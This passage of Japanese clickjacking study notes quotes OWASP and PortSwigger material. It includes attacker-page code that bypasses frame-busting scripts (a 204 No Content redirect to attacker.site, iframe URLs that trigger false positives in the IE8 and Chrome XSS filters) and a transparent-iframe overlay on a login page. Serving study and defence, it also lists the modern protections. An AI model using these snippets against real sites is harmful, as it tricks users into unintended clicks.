    header("HTTP/1.1 204 No Content");
?>
```
攻撃者ページ（逐語）:
```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```
〔補足: これがOWASPの「No-Content Flushing」断片（変数名不整合）の整合版に相当する。1msごとに204ページへナビゲーションを飛ばし、frame破りのトップレベル遷移をフラッシュ・無効化する。〕

### C-4. XSS Filter を悪用した frame-buster バイパス（歴史的手法, 逐語）

**IE8 XSS filter:** リクエスト/レスポンスの全パラメータを正規表現群と照合し、反射型XSSを検知するとページ内の全インラインスクリプト（frame破りスクリプトを含む）を無効化する。攻撃者はframe破りスクリプトの冒頭をリクエストパラメータに入れて**偽陽性を誘発**し、frame破りを殺せる。
```html
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```
攻撃者ビュー（逐語）:
```html
<iframe src=”http://target site/?param=<script>if”>
```

**Chrome 4.0 XSSAuditor filter:** IE8と挙動が少し違い、コードをリクエストパラメータで渡すと「script」を無効化できる。frame破りコードのスニペットだけを狙い撃ちで無効化し、他コードは残せる。
攻撃者ビュー（逐語, URLエンコード）:
```html
<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
```
〔補足（一般知識）: IE8 XSSフィルタ・Chrome XSSAuditor はいずれも現行ブラウザで**廃止済み**。歴史的なframe-busterバイパスとして理解する。現代の主防御はCSP frame-ancestors + X-Frame-Options + SameSite Cookie。〕

### C-5. チャレンジ（逐語）
```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
</div>
<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">Click me</button>
```

### C-6. ツール（逐語）
- portswigger/burp（Burp Suite / Clickbandit）
- zaproxy/zaproxy（OWASP ZAP）
- machine1337/clickjack

---

## 読者が自分で開くべき資料

### URL1: OWASP Clickjacking Defense Cheat Sheet — full取得済みだが、原典の読みどころ
（HTML版本体は egress で遮断されたが、内容は本ノート パートA に全文相当を収録。原典を直接開く場合の読みどころ）
- **CSP frame-ancestors の3例**（`'none'` / `'self'` / 複数ドメイン）と「`self`/`none` は必ずシングルクォート、他は不要」という文法規則。
- **X-Frame-Options がmetaタグでは効かない**という「Common Defense Mistakes」節（frame-ancestorsも同様）。
- **X-Frame-Options の各種制限**（ALLOW-FROM廃止・複数値不可・ネストフレーム・プロキシ剥がし・非推奨化）。
- **SameSite Cookie がクリックジャッキング緩和にもなる**理屈（iframe内リクエストにCookieが載らない）と、その限界（非認証攻撃には無力・約6%が未対応）。
- **「使ってはいけない」frame-buster** と、その4バイパス（Double Framing / onBeforeUnload / 204 No Content / Restricted zones=sandbox・designMode）。
- 図 `Clickjacking_Defense_Cheat_Sheet_NestedFrames.png`（ネストフレームでSAMEORIGIN/ALLOW-FROMが壊れる説明図）。

### URL2: PortSwigger「What is Clickjacking?」 — partial（本体は egress 403 で直接取得不可）
**なぜ取得できなかったか:** portswigger.net が本セッションの egress ポリシーにより CONNECT 段階で 403 拒否。web.archive.org・medium・hackmd 等のミラーも同様に403。GitHubの raw（frank-leitner ミラー / PayloadsAllTheThings）のみ到達可能だったため、記事本文の散文はWebSearchの逐語断片、HTML PoCはミラーのscript.pyから逐語収録した。**記事本体を自分で開いたときの読みどころ:**
- **「What is clickjacking?」冒頭**と、**「How is clickjacking different from CSRF?」** 節（能動的クリックが必要 vs リクエスト偽造、CSRFトークンで防げない理由）。
- **「How to construct a basic clickjacking attack」** の正典HTMLテンプレート（`iframe{position:relative;...z-index:2}` + `div{position:absolute;...z-index:1}` + `<div>Test me</div>`、opacity 0.1→0.0001）。本ノートB-1に逐語収録済み。
- **Burp Clickbandit** の使い方（record→finishでPoC自動生成）。
- **「Clickjacking with prefilled form input」**（GETパラメータでフォーム事前入力→透明submit）。
- **「Frame busting scripts」とそのバイパス**（`sandbox="allow-forms"` / `allow-scripts` で top-level navigation 無効化）。
- **「Combining clickjacking with a DOM XSS attack」**（iframe target URLにXSSを仕込み1クリックで発火）。
- **「Multistep clickjacking」**（decoyを複数重ねて確認ダイアログを突破）。
- **「How to prevent clickjacking attacks」**（CSP frame-ancestors推奨、X-Frame-Optionsは後方互換、frame-bustingの限界、defense in depth）。
- **5つのラボ**（lab-basic-csrf-protected / lab-prefilled-form-input / lab-frame-buster-script / lab-exploiting-to-trigger-dom-based-xss / lab-multistep）を実際に解く。各PoCは本ノートに逐語収録済み。

### 補足の一次資料（教科書に有用な原典）
- **Stanford Web Security "Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites"**（framebust.pdf, seclab.stanford.edu/websec/framebusting/）: frame-busterの分類とバイパスの学術的原典。onBeforeUnload・204・二重フレーム・XSSフィルタ悪用の理論的裏付け。
- **OWASP WSTG「Testing for Clickjacking」（WSTG-CLNT-09）**: 診断手順の標準。
- **MDN「Clickjacking」/「X-Frame-Options」/「CSP: frame-ancestors」**: 仕様とブラウザ互換性の正典。
